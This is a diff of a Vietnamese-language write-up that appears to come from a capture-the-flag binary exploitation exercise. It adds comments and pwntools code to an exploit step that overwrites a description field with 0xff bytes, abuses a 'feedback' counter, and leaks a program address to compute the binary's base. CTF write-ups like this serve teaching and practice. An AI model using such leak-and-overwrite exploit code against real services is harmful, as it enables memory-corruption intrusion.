@@ -57,14 +57,23 @@ Thay vào đó có thể ghi đè sẵn `0xffffffffffffff` bằng `changeDescrip
 
 Leak binary:
     
-    for i in range(7):
+    for i in range(7):            
         payload=b'A'*16
-        payload+=b'\xff'*(7-i)
+        payload+=b'\xff'*(7-i)            //ghi đè 0xff vào từng đoạn
         p.sendlineafter(b'Choice:',b'3')
         p.sendafter(b'New Description:',payload)
-        p.sendlineafter(b'Choice:',b'4')
-        p.sendlineafter(b':',b'1')
+        p.sendlineafter(b'Choice:',b'4')  //gọi feedback cộng 1
+        p.sendlineafter(b':',b'1')        
     
     p.sendlineafter(b'Choice:',b'4')
     p.sendlineafter(b':',b'1')
+
+    p.sendlineafter(b'Choice:',b'2')       //in chuỗi leak binary
+    p.recvuntil(b'\x01'*8)
+    exe_leak=u64(p.recv(6)+b'\x00\x00')
+    exe.address=exe_leak-0x1684
+    print(hex(exe_leak))
+
+
+
 
